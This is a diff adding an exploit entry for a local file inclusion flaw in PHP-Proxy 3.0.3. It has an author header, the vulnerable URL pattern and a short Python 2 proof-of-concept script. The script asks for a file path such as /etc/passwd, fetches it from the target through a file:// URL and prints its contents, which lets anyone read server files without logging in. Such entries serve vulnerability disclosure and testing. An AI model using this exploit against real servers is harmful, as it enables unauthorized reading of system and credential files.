@@ -1,0 +1,33 @@
+# Exploit Title: PHP-Proxy 3.0.3 - Local File Inclusion
+# Date: 04.11.2018
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Contact: https://pentest.com.tr
+# Vendor Homepage: https://www.php-proxy.com/
+# Software Link: https://github.com/Athlon1600/php-proxy-app
+# Version: v3.0.3
+# Category: Webapps
+# Tested on: XAMPP for Linux
+# Description: Any user can read files from the server
+# without authentication due to an existing LFI in the following path:
+# http://target/index.php?q=file:///[FilePath]
+
+# PoC
+
+#!/usr/bin/python
+
+import urllib2, httplib, sys
+
+print "\n[*] PHP-Proxy 3.0.3 LFI PoC By AkkuS"
+print "[*] My Blog - https://www.pentest.com.tr\n"
+print "[+] usage: python " + __file__ + " http://<target_ip/domain>"
+if (len(sys.argv) != 2):
+    print "[*] Usage: poc.py <target_ip/domain>"
+    exit(0)
+ip_add = sys.argv[1]
+
+fd = raw_input('[+] File or Directory: aka /etc/passwd and etc..\n')
+
+print "Exploiting....."
+print '\n'
+URL = "http://" + ip_add + "/index.php?q=file:///" + fd + ""
+print urllib2.urlopen(URL).read()
